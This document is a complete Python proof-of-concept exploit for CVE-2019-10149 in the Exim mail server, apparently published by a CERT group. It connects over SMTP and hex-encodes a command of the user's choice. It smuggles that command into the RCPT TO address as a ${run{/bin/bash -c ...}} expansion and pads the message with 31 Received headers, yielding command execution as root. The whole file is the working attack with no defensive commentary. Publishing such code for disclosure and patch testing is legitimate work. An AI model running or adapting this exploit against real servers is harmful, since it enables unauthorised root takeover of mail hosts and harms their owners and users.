#!/usr/bin/python3
import sys, socket, argparse

class exim_rce(object):
	def smtp_connect(self, hex_cmd, exim):
		message = "Received: 1\nReceived: 2\nReceived: 3\nReceived: 4\nReceived: 5\nReceived: 6\nReceived: 7\nReceived: 8\nReceived: 9\nReceived: 10\nReceived: 11\nReceived: 12\nReceived: 13\nReceived: 14\nReceived: 15\nReceived: 16\nReceived: 17\nReceived: 18\nReceived: 19\nReceived: 20\nReceived: 21\nReceived: 22\nReceived: 23\nReceived: 24\nReceived: 25\nReceived: 26\nReceived: 27\nReceived: 28\nReceived: 29\nReceived: 30\nReceived: 31"
		rcpt = r"<${run{\x2Fbin\x2Fbash\t-c\t\x22" + hex_cmd + r"\x22}}@localhost>"
		server = exim

		try:
			print("[+] Trying to connect to the server")
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect(server)
			s.recv(1024)
			print("[+] Sending commands to the Exim Server")
			s.send("HELO evil.localhost\r\n".encode())
			s.recv(1024)
			s.send("MAIL FROM: <>\r\n".encode())
			s.recv(1024)
			s.send("RCPT TO:".encode() + rcpt.encode() + "\r\n".encode())
			s.recv(1024)
			s.send("DATA\r\n".encode())
			s.recv(1024)
			s.send(message.encode() + "\r\n.\r\n".encode())
			s.recv(1024)
			s.send("QUIT\r\n".encode())
		except Exception as e:
			print("[--] The server is not responding[--]")

	def cmd(self,command,server):
		cmd = []
		for letter in command:
			c=hex(ord(letter))
			cmd.append(c)
			hex_cmd = ''.join(cmd).replace("0x","\\x")
		self.smtp_connect(hex_cmd,server)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(description = "[MNEMO-CERT] - PoC CVE-2019-10149 Exim - Command Execution as root")
	parser.add_argument('-s','--server', help="Exim server IP address and port <IP:Port> - Default: localhost:25")

	requiredArg = parser.add_argument_group("Required argument")
	requiredArg.add_argument('-c','--cmd', help='Type the command you want to execute through Exim')
	args, unknown = parser.parse_known_args()
	if args.server is not None:
		srv = args.server.split(":")
		server = (srv[0],int(srv[1]))
	else:
		server = ("localhost", 25)

	if args.cmd:
		mnemo = exim_rce()
		cmd = args.cmd
		mnemo.cmd(cmd,server)
		
	else:
		parser.print_help()
		sys.exit(1)
